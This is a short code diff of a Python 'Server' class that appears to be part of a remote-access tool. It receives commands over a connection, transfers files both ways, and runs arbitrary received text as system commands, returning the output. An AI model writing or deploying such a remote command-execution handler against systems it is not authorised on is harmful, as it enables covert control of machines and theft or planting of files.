@@ -44,7 +44,7 @@ class Server:
         while True:
             try:
                 receive = self.reliable_receive()
-                split_command = receive.split()
+                split_command = receive
                 if split_command[0] == "quit":
                     self.server.close()
                     exit()
@@ -56,14 +56,14 @@ class Server:
                     sending_data = file
                 elif split_command[0] == "upload" and split_command[1] is not None:
                     self.write_file(split_command[1], split_command[2])
-                    print("demon", split_command[2])
                     sending_data = f"FIle uploaded at {split_command[1]}"
                 else:
-                    result = self.execute_command_on_system(receive)
+                    result = self.execute_command_on_system(' '.join(receive))
                     sending_data = result
 
                 self.reliable_send(sending_data)
             except Exception as error:
+                print(error)
                 self.reliable_send("We encountered an error.")
 
     def execute_command_on_system(self, command):
